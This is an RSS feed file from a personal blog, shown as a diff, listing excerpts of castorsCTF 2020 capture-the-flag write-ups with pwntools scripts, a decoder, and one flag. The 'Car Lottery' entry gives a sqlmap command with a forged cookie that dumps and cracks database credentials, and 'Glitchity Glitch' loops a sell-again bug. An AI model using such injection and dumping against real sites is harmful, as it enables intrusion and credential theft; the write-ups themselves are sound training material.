@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Coding on Blog</title>
+    <link>/tags/coding/</link>
+    <description>Recent content in Coding on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Ahmed Selim Üzüm</copyright>
+    
+	<atom:link href="/tags/coding/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Arithmetics</title>
+      <link>/writups/castorsctf20/arithmetics/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/arithmetics/</guid>
+      <description>When we connect to the server, we can see we have to answer a lot of questions. So that let&amp;rsquo;s write a script!
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;,14429) conn.recvuntil(&amp;#34;&amp;lt;&amp;#34;) conn.recvuntil(&amp;#34;\n&amp;#34;) conn.send(&amp;#34;\n&amp;#34;) sayilar = {&amp;#34;one&amp;#34;:1, &amp;#34;two&amp;#34;:2, &amp;#34;three&amp;#34;:3, &amp;#34;four&amp;#34;:4, &amp;#34;five&amp;#34;:5, &amp;#34;six&amp;#34;:6, &amp;#34;seven&amp;#34;:7, &amp;#34;eight&amp;#34;:8, &amp;#34;nine&amp;#34;:9, &amp;#34;zero&amp;#34;:0} while True: try: soru = conn.recvline() print(soru) soru = str(soru).split(&amp;#34; &amp;#34;) try: sayi1 = int(soru[2]) except: sayi1 = sayilar[soru[2]] try: sayi2 = int(soru[4]) except: sayi2 = sayilar[soru[4]] if soru[3] == &amp;#39;+&amp;#39; or soru[3] == &amp;#34;plus&amp;#34;: islem = &amp;#34;+&amp;#34; sonuc = sayi1 + sayi2 elif soru[3] == &amp;#39;-&amp;#39; or soru[3] == &amp;#34;minus&amp;#34;: islem = &amp;#34;-&amp;#34; sonuc = sayi1 - sayi2 elif soru[3] == &amp;#39;*&amp;#39; or soru[3] == &amp;#34;multiplied-by&amp;#34;: islem = &amp;#34;*&amp;#34; sonuc = sayi1 * sayi2 elif soru[3] == &amp;#39;//&amp;#39; or soru[3] == &amp;#34;divided-by&amp;#34;: islem = &amp;#34;/&amp;#34; sonuc = sayi1 // sayi2 conn.</description>
+    </item>
+    
+    <item>
+      <title>Base Number</title>
+      <link>/writups/castorsctf20/base_runner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/base_runner/</guid>
+      <description>For getting the flag in this challenge we should first decode the given binary from binary, then octal, then hex and then base64.
+from pwn import * import base64 def decode(data): bin_decoded = &amp;#34;&amp;#34; for d in data.split(&amp;#34; &amp;#34;): binary = chr(int(d, 2)) bin_decoded += binary oct_decoded = &amp;#34;&amp;#34; for s in bin_decoded.split(&amp;#34; &amp;#34;): oct_decoded += str(chr(int(s, 8))) hex_decoded = &amp;#34;&amp;#34; for s in oct_decoded.split(&amp;#34; &amp;#34;): hex_decoded += str(chr(int(s, 16))) return base64.</description>
+    </item>
+    
+    <item>
+      <title>Car Lottery</title>
+      <link>/writups/castorsctf20/car_lottery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/car_lottery/</guid>
+      <description>First, with changing our client cookie to 3123248 we can access winner page. Then we can see site is using id param for getting car types. And if we use a invalid car type and then send a invalid ID we get an SQL error!
+With that we can dump data (and crack) from SQL database using this command:
+sqlmap -u &amp;#34;http://web1.cybercastors.com:14435/search?id=&amp;#34; --method=POST --cookie=&amp;#34;client=3123248&amp;#34; --dump And we got some creds! For using them we can find the /dealer dir using gobuster.</description>
+    </item>
+    
+    <item>
+      <title>Glitchity Glitch</title>
+      <link>/writups/castorsctf20/glitchity_glitch/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/writups/castorsctf20/glitchity_glitch/</guid>
+      <description>For getting the flag in this challenge we have to have lots of money. For this we can buy VPN, then sell it and because of the glitch we can sell it again and again! So let&amp;rsquo;s write a script for earning money.
+from pwn import * conn = remote(&amp;#34;chals20.cybercastors.com&amp;#34;, 14432) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) conn.sendline(&amp;#34;6&amp;#34;) print(conn.recvuntil(&amp;#34;Choice:&amp;#34;)) for i in range(1020): conn.sendline(&amp;#34;0&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) conn.sendline(&amp;#34;1&amp;#34;) conn.recvuntil(&amp;#34;Choice:&amp;#34;) print(i) conn.interactive() Flag: castorsCTF{$imPl3_sTUph_3h?}</description>
+    </item>
+    
+  </channel>
+</rss>
